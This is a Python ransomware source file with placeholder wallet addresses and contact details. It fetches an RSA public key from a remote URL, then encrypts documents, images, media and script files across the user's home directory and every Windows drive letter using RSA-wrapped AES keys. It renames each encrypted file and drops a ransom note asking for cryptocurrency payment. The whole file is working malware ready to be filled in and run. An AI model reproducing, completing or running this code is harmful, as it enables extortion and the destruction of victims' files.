import os
import random
import hashlib
import requests as req
from time import sleep
from sys import platform
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

# On Website
url_web = "YOUR URL"
url_list = ["LIST KEY"]
key_c = random.choice(url_list)
ext = '.' + key_c.split('.')[1]
URL_KEY = url_web + key_c
pbk = req.get(URL_KEY).text
lcx = hashlib.sha1(key_c.split('.')[0].encode('utf-8')).hexdigest()+'.'+key_c.split('.')[1]

WALLET_ADDRESS = '''
BTC_ADDRESS  : 
TRX_ADDRESS  : 
BUSD_ADDRESS : 
'''
CONTACT = '''YOUR CONTACT'''

def sp():
    if(platform == 'win32'):
        return '\\'
    elif(platform == 'linux'):
        return '/'

def encrypt(filename):
    with open(filename, "rb") as file:
        file_data = file.read()
        recipient_key = RSA.importKey(pbk)
        session_key = get_random_bytes(16)

        # Encrypt the session key with the public RSA key
        cipher_rsa = PKCS1_OAEP.new(recipient_key)
        enc_session_key = cipher_rsa.encrypt(session_key)
        
        # Encrypt the data with the AES session key
        cipher_aes = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(file_data)
    with open(filename, "wb") as file:
        [ file.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext) ]


def attack(target):

    fl = ".c",".jpeg",".JPEG",".jpg",".JPG",".png",".PNG",".bmp",".BMP",".doc",".DOC",".docx",".xls",".xlsx",".ppt",".pptx",".pdf",".mp4",".mkv",".mpeg",".avi",".ai",".ait",".cdr",".odt",".ods",".odp",".msi",".bat",".vbs",".html",".php",".js",".css"

    for p, d, f in os.walk(target):
        for name in f:
            if name.endswith((fl)):
                try:
                    encrypt(os.path.join(p, name))
                    newFile = name +  ext
                    os.rename(os.path.join(p, name), os.path.join(p,newFile))
                except:
                    continue

def jejak(path):
    # Tinggalkan pesan pada lines dibawah ini
    try:
        lines = '''        !ATTENTION!
        Don't worry, you can return all your files!
        All your files like photos, database, documents,
        and other important are encrypted with strongest encryption and unique key.
        I want to continue my studies, But need some money,
        If you want to back your file, you can buy my decrypt tools
        Price of decrypt tools is $10 - $1000 depend on large files''' + '''
        Choice one payment\n'''+ WALLET_ADDRESS + '''
        
        Your Personal Key is : ''' + lcx + '''
        ''' + CONTACT + '''
        Thank You For Your Attention (*v*)'''
        with open(path + sp() + '_readme.txt', 'w') as f:
            f.writelines(lines)
        with open(path + sp() +'.license','w') as l:
            l.write(lcx)
    except PermissionError:
        problem = "Tidak bisa di isi file"

if __name__ == '__main__':
    if (platform == 'win32'):
        t = [os.environ["USERPROFILE"],"A:","B:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:","M:","O:","P:","Q:","R:","S:","T:","U:","V:","W:","X:","Y:","Z:"]
        jlog = [os.environ["PROGRAMDATA"]+sp()+'Microsoft'+sp()+'Windows'+sp()+'Start Menu'+sp()+'Programs'+sp()+'StartUp']
        jejak(jlog)
        for i in range(len(t)):
            attack(t[i] + sp())
            sleep(1800)
    elif (platform == 'linux'):
        t = [os.environ["HOME"]]
        jejak(t + sp())
        for i in range(len(t)):
            attack(t[i] + sp())
            sleep(1800)
    else:
        print('I will better')